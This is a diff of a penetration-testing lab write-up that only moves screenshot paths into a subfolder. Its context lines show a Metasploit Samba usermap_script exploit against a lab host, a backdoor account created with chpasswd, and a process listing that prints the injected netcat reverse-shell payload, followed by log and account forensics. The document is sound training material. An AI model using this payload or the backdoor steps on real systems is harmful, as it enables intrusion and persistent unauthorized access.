@@ -23,22 +23,22 @@ Port 139/445 was already identified in [01-reconnaissance.md](01-reconnaissance.
 
 Searching Metasploit for `samba` returned many modules. The one matching this target's exact version range (3.0.20 to 3.0.25rc3) is `exploit/multi/samba/usermap_script`, rank Excellent, disclosed 2007-05-14. Other listed modules (`nttrans`, `trans2open`, `chain_reply`, `is_known_pipename`) were ruled out because they target different Samba version ranges or rely on memory corruption, which carries a lower reliability rank than a straightforward command injection.
 
-![Search results for samba modules](assets/04-msf-search-results.png)
+![Search results for samba modules](assets/04/04-msf-search-results.png)
 
 Running `info` on the module before use confirmed the version range, the lack of any authentication requirement, and the primary reference (CVE-2007-2447):
 
-![Module info output](assets/04-msf-module-info-1.png)
-![Module info output continued](assets/04-msf-module-info-2.png)
+![Module info output](assets/04/04-msf-module-info-1.png)
+![Module info output continued](assets/04/04-msf-module-info-2.png)
 
 ### Delivery
 
 The module was selected with `use exploit/multi/samba/usermap_script`. Its default payload is `cmd/unix/reverse_netcat`, simpler than the staged Meterpreter payload used in the vsftpd exercise, it opens a direct reverse shell via netcat rather than downloading a separate binary.
 
-![Module options before configuration](assets/04-msf-module-options.png)
+![Module options before configuration](assets/04/04-msf-module-options.png)
 
 `RHOSTS` was set to the target (192.168.10.20) and `LHOST` to the attacking Kali machine (192.168.10.10), confirmed with `get`:
 
-![RHOST and LHOST configured](assets/04-msf-target-configured.png)
+![RHOST and LHOST configured](assets/04/04-msf-target-configured.png)
 
 ### Exploitation
 
@@ -64,7 +64,7 @@ echo "backdoor:senha123" | chpasswd
 
 Both commands succeed silently. Confirmed against `/etc/passwd`:
 
-![Backdoor account confirmed in /etc/passwd](assets/04-msf-backdoor-user-created.png)
+![Backdoor account confirmed in /etc/passwd](assets/04/04-msf-backdoor-user-created.png)
 
 This account would let an attacker regain access later via SSH, without needing to exploit Samba again.
 
@@ -76,7 +76,7 @@ The reverse shell itself is the control channel: `netcat` connecting from the ta
 
 Root access was confirmed directly from the shell:
 
-![whoami and uname confirming root access](assets/04-msf-whoami-root.png)
+![whoami and uname confirming root access](assets/04/04-msf-whoami-root.png)
 
 ```
 whoami
@@ -123,7 +123,7 @@ log.192.168.10.10  log.nmbd  log.smbd
 
 Its existence alone confirms a connection attempt from that IP occurred, independent of content. Its content, however, was empty:
 
-![Samba per-client log metadata, empty file owned by root](assets/04-defense-samba-log-metadata.png)
+![Samba per-client log metadata, empty file owned by root](assets/04/04-defense-samba-log-metadata.png)
 
 ```
 -rw-r--r-- 1 root root 0 2026-08-22 15:34 log.192.168.10.10
@@ -133,7 +133,7 @@ Checking why: `grep -i "log level" /etc/samba/smb.conf` returned nothing, meanin
 
 **System authentication log.** `/var/log/auth.log` records privileged commands and account changes. A first pass surfaced an entry that looked interesting but turned out to be a false lead: a `sudo cat log.192.168.10.10` command, that was this investigation's own activity moments earlier, not the incident. Filtering that out and continuing through the file surfaced the actual finding:
 
-![auth.log showing creation of the backdoor account](assets/04-defense-auth-log-backdoor-created.png)
+![auth.log showing creation of the backdoor account](assets/04/04-defense-auth-log-backdoor-created.png)
 
 ```
 Aug 22 15:53:58 metasploitable useradd[4905]: new group: name=backdoor, GID=1003
@@ -144,15 +144,15 @@ A local account named `backdoor` was created directly on the system, not through
 
 **Account details.** Cross-checked against `/etc/passwd`, `/etc/shadow`, and `/etc/gshadow`:
 
-![backdoor entry in /etc/passwd](assets/04-defense-etc-passwd-backdoor.png)
-![backdoor entry in /etc/shadow](assets/04-defense-etc-shadow-backdoor-hash.png)
-![backdoor entry in /etc/gshadow](assets/04-defense-etc-gshadow-backdoor.png)
+![backdoor entry in /etc/passwd](assets/04/04-defense-etc-passwd-backdoor.png)
+![backdoor entry in /etc/shadow](assets/04/04-defense-etc-shadow-backdoor-hash.png)
+![backdoor entry in /etc/gshadow](assets/04/04-defense-etc-gshadow-backdoor.png)
 
 The account has an active password hash. Notably, that hash (`tyEI3PAGkGJRA`, 13 characters, no `$1$` prefix) uses the older DES-based crypt format, while every other account on the system uses the modern MD5 format (`$1$...`). This is itself a secondary anomaly, a legitimate administrator provisioning a new account through normal tooling would be expected to produce a hash consistent with the rest of the system.
 
 **Running processes.** `ps aux` revealed the exploitation mechanism directly:
 
-![ps aux revealing the injection payload and script path](assets/04-defense-ps-aux-injection-payload.png)
+![ps aux revealing the injection payload and script path](assets/04/04-defense-ps-aux-injection-payload.png)
 
 ```
 root  4847  ...  15:34  sh -c /etc/samba/scripts/mapusers.sh "/=`nohup mkfifo /tmp/ltfb; nc 192.168.10.10 4444 0</tmp/ltfb | /bin/sh >/tmp/ltfb 2>&1; rm /tmp/ltfb`"
@@ -164,7 +164,7 @@ root  4851  ...  15:34  /bin/sh
 
 **Network connections.** `netstat -antp` confirmed the same connection still active at the network layer:
 
-![netstat showing the established reverse shell connection](assets/04-defense-netstat-reverse-shell.png)
+![netstat showing the established reverse shell connection](assets/04/04-defense-netstat-reverse-shell.png)
 
 ```
 tcp  192.168.10.20:139   192.168.10.10:46083  CLOSE_WAIT
